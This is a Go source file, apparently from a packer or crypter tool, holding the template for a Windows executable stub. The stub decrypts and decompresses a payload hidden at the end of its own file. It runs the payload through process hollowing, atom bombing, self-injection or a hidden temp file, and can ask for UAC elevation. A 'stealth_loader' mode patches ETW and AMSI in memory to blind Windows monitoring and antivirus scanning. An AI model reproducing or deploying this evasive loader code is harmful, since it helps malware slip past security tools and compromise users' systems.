package pack

import (
	"strings"

	winstrat "gosstrip/pack/strategies/windows"
)

const (
	peProcessHollowingPlaceholder = "{{PROCESS_HOLLOWING_IMPL}}"
	peAtomicBombingPlaceholder    = "{{ATOMIC_BOMBING_IMPL}}"
	peSelfInjectionPlaceholder    = "{{SELF_INJECTION_IMPL}}"
)

// PEStubTemplate contiene il template base per lo stub PE
// Questo codice verrà compilato e iniettato con il payload compresso/cifrato

const PEStubSource = `
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/binary"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"runtime/debug"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ulikunitz/xz"
	"golang.org/x/crypto/chacha20poly1305"
)

var peEmbeddedArgs []string

// Windows API
var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")
	shell32  = syscall.NewLazyDLL("shell32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	amsi     = syscall.NewLazyDLL("amsi.dll")

	procCreateProcess    = kernel32.NewProc("CreateProcessW")
	procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMem  = kernel32.NewProc("WriteProcessMemory")
	procVirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
	procReadProcessMem   = kernel32.NewProc("ReadProcessMemory")
	procGetThreadCtx     = kernel32.NewProc("GetThreadContext")
	procSetThreadCtx     = kernel32.NewProc("SetThreadContext")
	procResumeThread     = kernel32.NewProc("ResumeThread")
	procNtUnmapView      = ntdll.NewProc("NtUnmapViewOfSection")
	procSetFileAttrs     = kernel32.NewProc("SetFileAttributesW")
	procMoveFileEx       = kernel32.NewProc("MoveFileExW")
	procGetCurrentProcess = kernel32.NewProc("GetCurrentProcess")
	procShellExecute     = shell32.NewProc("ShellExecuteW")
	procOpenProcessToken = advapi32.NewProc("OpenProcessToken")
	procGetTokenInfo     = advapi32.NewProc("GetTokenInformation")
	procGlobalAddAtom    = kernel32.NewProc("GlobalAddAtomW")
	procGlobalGetAtom    = kernel32.NewProc("GlobalGetAtomNameW")
	procGlobalDeleteAtom = kernel32.NewProc("GlobalDeleteAtom")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procCloseHandle         = kernel32.NewProc("CloseHandle")
	procLoadLibraryA        = kernel32.NewProc("LoadLibraryA")
	procGetProcAddress      = kernel32.NewProc("GetProcAddress")
	procEtwEventWrite       = ntdll.NewProc("EtwEventWrite")
	procAmsiScanBuffer      = amsi.NewProc("AmsiScanBuffer")

	procNtAllocateVirtualMemory = ntdll.NewProc("NtAllocateVirtualMemory")
	procNtProtectVirtualMemory  = ntdll.NewProc("NtProtectVirtualMemory")
	procNtCreateThreadEx        = ntdll.NewProc("NtCreateThreadEx")
	procNtWaitForSingleObject   = ntdll.NewProc("NtWaitForSingleObject")
	procNtClose                 = ntdll.NewProc("NtClose")

	procRegisterClassEx  = user32.NewProc("RegisterClassExW")
	procCreateWindowEx   = user32.NewProc("CreateWindowExW")
	procDefWindowProc    = user32.NewProc("DefWindowProcW")
	procSendMessage      = user32.NewProc("SendMessageW")
	procGetMessage       = user32.NewProc("GetMessageW")
	procTranslateMessage = user32.NewProc("TranslateMessage")
	procDispatchMessage  = user32.NewProc("DispatchMessageW")
	procPostQuitMessage  = user32.NewProc("PostQuitMessage")
	procDestroyWindow    = user32.NewProc("DestroyWindow")
)

var (
	etwPatched  bool
	amsiPatched bool
)


func main() {
	// 1. Read metadata and payload from end of file: [payload][metadata][metadata_size:8]
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}
	f, err := os.Open(exePath)
	if err != nil {
		os.Exit(1)
	}
	defer f.Close()

	stat, _ := f.Stat()
	fileSize := stat.Size()

	// Read metadata size (last 8 bytes)
	f.Seek(fileSize-8, 0)
	var metadataSize uint64
	binary.Read(f, binary.LittleEndian, &metadataSize)

	// Read metadata
	metadataOffset := fileSize - 8 - int64(metadataSize)
	f.Seek(metadataOffset, 0)
	metadataBytes := make([]byte, metadataSize)
	f.Read(metadataBytes)
	m := parseMetadata(metadataBytes)

	// Read encrypted payload
	payloadOffset := metadataOffset - int64(m.EncryptedSize)
	f.Seek(payloadOffset, 0)
	encryptedPayload := make([]byte, m.EncryptedSize)
	f.Read(encryptedPayload)
	f.Close()

	// 2. Decrypt
	decrypted, err := decrypt(encryptedPayload, m.Key, m.Nonce, m.EncryptionAlgo)
	if err != nil {
		os.Exit(1)
	}

	// 3. Decompress
	decompressed, err := decompress(decrypted, m.CompressionAlgo)
	if err != nil {
		os.Exit(1)
	}

	// 3.5. Remove any random padding using OriginalSize (if present)
	payload := trimToOriginal(decompressed, m.OriginalSize)

	configuredArgs := parseUserParams(m.UserParams)
	peEmbeddedArgs = combineArgs(configuredArgs, os.Args[1:])

	// 4. Execute
	mode := strings.ToLower(strings.TrimSpace(m.InMemoryMode))
	switch mode {
	case "process_hollowing", "auto":
		executeProcessHollowing(payload)
case "atomic_bombing":
	executeAtomicBombing(payload)
case "stealth_loader":
	disableStealthGuards()
	executeStealthLoader(payload)
	case "self_injection":
		executeSelfInjection(payload)
	case "", "off":
		executeFromTemp(payload)
	default:
		if m.UseInMemory {
			executeProcessHollowing(payload)
		} else {
			executeFromTemp(payload)
		}
	}
}

type Metadata struct {
	OriginalSize    uint64
	CompressedSize  uint64
	EncryptedSize   uint64
	CompressionAlgo string
	EncryptionAlgo  string
	Key             []byte
	Nonce           []byte
	UseInMemory     bool
	InMemoryMode    string
	UserParams      string
}

func parseMetadata(data []byte) *Metadata {
	r := bytes.NewReader(data)
	m := &Metadata{}

	binary.Read(r, binary.LittleEndian, &m.OriginalSize)
	binary.Read(r, binary.LittleEndian, &m.CompressedSize)
	binary.Read(r, binary.LittleEndian, &m.EncryptedSize)

	compAlgo := make([]byte, 16)
	r.Read(compAlgo)
	m.CompressionAlgo = string(bytes.TrimRight(compAlgo, "\x00"))

	encAlgo := make([]byte, 16)
	r.Read(encAlgo)
	m.EncryptionAlgo = string(bytes.TrimRight(encAlgo, "\x00"))

	var keySize, nonceSize uint32
	binary.Read(r, binary.LittleEndian, &keySize)
	if keySize > 0 {
		m.Key = make([]byte, keySize)
		r.Read(m.Key)
	}
	binary.Read(r, binary.LittleEndian, &nonceSize)
	if nonceSize > 0 {
		m.Nonce = make([]byte, nonceSize)
		r.Read(m.Nonce)
	}
	b, _ := r.ReadByte()
	m.UseInMemory = (b == 1)
	modeRaw := make([]byte, 16)
	r.Read(modeRaw)
	m.InMemoryMode = string(bytes.TrimRight(modeRaw, "\x00"))
	var paramLen uint32
	binary.Read(r, binary.LittleEndian, &paramLen)
	if paramLen > 0 {
		paramBuf := make([]byte, paramLen)
		r.Read(paramBuf)
		m.UserParams = string(paramBuf)
	}
	return m
}

// decrypt decifra il payload
func decrypt(data, key, nonce []byte, algo string) ([]byte, error) {
	switch algo {
	case "xor":
		return decryptXOR(data, key), nil
	case "aes-256-gcm":
		return decryptAES(data, key, nonce)
	case "chacha20":
		return decryptChaCha(data, key, nonce)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

func decryptXOR(data, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

func decryptAES(data, key, nonce []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, nonce, data, nil)
}

func decryptChaCha(data, key, nonce []byte) ([]byte, error) {
	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, err
	}
	return aead.Open(nil, nonce, data, nil)
}

// decompress decomprime il payload
func decompress(data []byte, algo string) ([]byte, error) {
	switch algo {
	case "xz", "lzma":
		r, err := xz.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, err
		}
		return io.ReadAll(r)
	case "none":
		return data, nil
	default:
		return nil, nil
	}
}

func removePadding(data []byte, offsets []int) []byte {
	if len(offsets) == 0 {
		return data
	}
	// Implementazione semplificata
	return data
}

// trimToOriginal slices the decompressed buffer back to the original payload size.
// When random padding is enabled during packing, padding bytes are added split
// before and after the original. We can reconstruct the original by taking the
// middle slice of length originalSize.
func trimToOriginal(data []byte, originalSize uint64) []byte {
	if originalSize == 0 {
		return data
	}
	total := uint64(len(data))
	if total == originalSize {
		return data
	}
	if total > originalSize {
		extra := total - originalSize
		front := int(extra / 2)
		start := front
		end := start + int(originalSize)
		if start >= 0 && end <= len(data) && end >= start {
			return data[start:end]
		}
	}
	// Fallback if sizes are unexpected
	return data
}

` + peProcessHollowingPlaceholder + `
` + peAtomicBombingPlaceholder + `
` + peSelfInjectionPlaceholder + `

// executeFromTemp esegue il payload da file temporaneo (preferibilmente nella stessa cartella dell'eseguibile impacchettato)
func executeFromTemp(payload []byte) {
	// Determina la directory del binario impacchettato
	exePath, _ := os.Executable()
	dir := ""
	if exePath != "" {
		dir = filepath.Dir(exePath)
	}

	// Prova a creare l'eseguibile temporaneo nella stessa directory del pacchetto
	var tmp *os.File
	var err error
	if dir != "" {
		tmp, err = os.CreateTemp(dir, ".~tmp-*.exe")
	}
	// Fallback: usa la directory temporanea di sistema
	if err != nil || tmp == nil {
		tmp, err = os.CreateTemp("", ".tmp-*.exe")
		if err != nil {
			os.Exit(1)
		}
	}
	tmpPath := tmp.Name()

	_, _ = tmp.Write(payload)
	_ = tmp.Close()

	// Nascondi e marca come temporaneo per ridurre visibilità
	if p := syscall.StringToUTF16Ptr(tmpPath); p != nil {
		const FILE_ATTRIBUTE_HIDDEN = 0x2
		const FILE_ATTRIBUTE_TEMPORARY = 0x100
		_, _, _ = procSetFileAttrs.Call(uintptr(unsafe.Pointer(p)), uintptr(FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_TEMPORARY))
	}

	// Se il payload richiede privilegi elevati e il processo corrente non è elevato,
	// usa ShellExecuteW con verbo "runas" per lanciare con UAC
	if !isProcessElevated() && payloadRequiresAdmin(payload) {
		params := buildCmdline(peEmbeddedArgs)
		var dirPtr *uint16
		if dir != "" {
			dirPtr = syscall.StringToUTF16Ptr(dir)
		}
		r, _, _ := procShellExecute.Call(
			0,
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath))),
			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(params))),
			uintptr(unsafe.Pointer(dirPtr)),
			uintptr(1), // SW_SHOWNORMAL
		)
		if r > 32 {
			// Cleanup non bloccante: il file sarà in uso finché il processo elevato è attivo
			cleanupTempFile(tmpPath)
			return
		}
		// fallback a esecuzione non elevata se ShellExecute fallisce
	}

	cmd := exec.Command(tmpPath, peEmbeddedArgs...)
	if dir != "" {
		cmd.Dir = dir
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	_ = cmd.Run()

	cleanupTempFile(tmpPath)
}

// cleanupTempFile rimuove il file temporaneo con retry e, se necessario, pianifica la cancellazione al reboot
func cleanupTempFile(path string) {
	deleteWithRetries := func(p string) bool {
		for i := 0; i < 50; i++ { // ~10s total at 200ms intervals
			if err := os.Remove(p); err == nil {
				return true
			}
			time.Sleep(200 * time.Millisecond)
		}
		return false
	}
	if !deleteWithRetries(path) {
		const MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
		pOld := syscall.StringToUTF16Ptr(path)
		_, _, _ = procMoveFileEx.Call(uintptr(unsafe.Pointer(pOld)), uintptr(0), uintptr(MOVEFILE_DELAY_UNTIL_REBOOT))
	}
}

func disableStealthGuards() {
	disableETW()
	disableAMSI()
}

func disableETW() {
	if etwPatched || runtime.GOARCH != "amd64" {
		return
	}
	addr := procEtwEventWrite.Addr()
	if addr == 0 {
		return
	}
	if patchMemory(addr, []byte{0xC3}) {
		etwPatched = true
	}
}

func disableAMSI() {
	if amsiPatched || runtime.GOARCH != "amd64" {
		return
	}
	if err := amsi.Load(); err != nil {
		return
	}
	addr := procAmsiScanBuffer.Addr()
	if addr == 0 {
		return
	}
	if patchMemory(addr, []byte{0x31, 0xC0, 0xC3}) {
		amsiPatched = true
	}
}

func patchMemory(addr uintptr, patch []byte) bool {
	if addr == 0 || len(patch) == 0 {
		return false
	}
	var oldProtect uint32
	ret, _, _ := procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		0x40,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return false
	}
	for i := 0; i < len(patch); i++ {
		ptr := (*byte)(unsafe.Pointer(addr + uintptr(i)))
		*ptr = patch[i]
	}
	procVirtualProtect.Call(
		addr,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return true
}

func parseUserParams(raw string) []string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil
	}
	var args []string
	var current strings.Builder
	inQuotes := false
	for _, r := range raw {
		switch r {
		case '"':
			inQuotes = !inQuotes
		case ' ', '\t':
			if inQuotes {
				current.WriteRune(r)
			} else if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteRune(r)
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}

func combineArgs(configured, runtime []string) []string {
	if len(configured) == 0 && len(runtime) == 0 {
		return nil
	}
	args := make([]string, 0, len(configured)+len(runtime))
	args = append(args, configured...)
	args = append(args, runtime...)
	return args
}

func quoteArg(arg string) string {
	if arg == "" {
		return "\"\""
	}
	if strings.IndexFunc(arg, func(r rune) bool {
		return r == ' ' || r == '\t' || r == '"'
	}) == -1 {
		return arg
	}
	escaped := strings.ReplaceAll(arg, "\"", "\\\"")
	return "\"" + escaped + "\""
}

func buildCommandLine(exePath string, args []string) []uint16 {
	if len(args) == 0 {
		return nil
	}
	parts := make([]string, 0, len(args)+1)
	parts = append(parts, quoteArg(exePath))
	for _, a := range args {
		parts = append(parts, quoteArg(a))
	}
	utf16, _ := syscall.UTF16FromString(strings.Join(parts, " "))
	return utf16
}

// buildCmdline unisce gli argomenti in una stringa semplice (quoting minimale)
func buildCmdline(args []string) string {
	if len(args) == 0 {
		return ""
	}
	// Nota: per semplicità non gestiamo escaping complesso
	// Se servono argomenti con spazi, Windows li accetta con doppi apici
	var buf bytes.Buffer
	for i, a := range args {
		if i > 0 {
			buf.WriteByte(' ')
		}
		needsQuote := false
		for j := 0; j < len(a); j++ {
			c := a[j]
			if c == ' ' || c == '\t' || c == '"' {
				needsQuote = true
				break
			}
		}
		if needsQuote {
			buf.WriteByte('"')
			for j := 0; j < len(a); j++ {
				if a[j] == '"' {
					buf.WriteByte('\\')
				}
				buf.WriteByte(a[j])
			}
			buf.WriteByte('"')
		} else {
			buf.WriteString(a)
		}
	}
	return buf.String()
}

// payloadRequiresAdmin prova a rilevare dal manifest se è richiesta elevazione UAC
func payloadRequiresAdmin(payload []byte) bool {
	// Heuristics: cerca stringhe del manifest comunemente presenti
	if bytes.Contains(payload, []byte("requireAdministrator")) {
		return true
	}
	// Alcune app usano highestAvailable; in ambienti admin può comunque mostrare UAC
	if bytes.Contains(payload, []byte("requestedExecutionLevel")) && bytes.Contains(payload, []byte("highestAvailable")) {
		return true
	}
	return false
}

// isProcessElevated verifica se il processo corrente è già elevato (Admin)
func isProcessElevated() bool {
	// OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)
	const TOKEN_QUERY = 0x0008
	const TokenElevation = 20
	var token syscall.Token
	// Obtain current process handle via Kernel32!GetCurrentProcess to avoid syscall API signature differences
	ph, _, _ := procGetCurrentProcess.Call()
	r1, _, _ := procOpenProcessToken.Call(
		ph,
		uintptr(TOKEN_QUERY),
		uintptr(unsafe.Pointer(&token)),
	)
	if r1 == 0 {
		return false
	}
	defer token.Close()
	var elevation uint32
	var outLen uint32
	procGetTokenInfo.Call(
		uintptr(token),
		uintptr(TokenElevation),
		uintptr(unsafe.Pointer(&elevation)),
		uintptr(4),
		uintptr(unsafe.Pointer(&outLen)),
	)
	return elevation != 0
}

// Helper functions con error checking

`

// GetPEStubSource ritorna il codice sorgente dello stub PE
func GetPEStubSource(arch string) string {
	if arch == "386" {
		replacer := strings.NewReplacer(
			peProcessHollowingPlaceholder, "func executeProcessHollowing(payload []byte) { executeSelfInjection(payload) }\n",
			peAtomicBombingPlaceholder, "func executeAtomicBombing(payload []byte) { executeSelfInjection(payload) }\n",
			peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime32,
		)
		return replacer.Replace(PEStubSource)
	}
	replacer := strings.NewReplacer(
		peProcessHollowingPlaceholder, winstrat.ProcessHollowingRuntime,
		peAtomicBombingPlaceholder, winstrat.AtomicBombingRuntime,
		peSelfInjectionPlaceholder, winstrat.SelfInjectionRuntime64,
	)
	return replacer.Replace(PEStubSource)
}
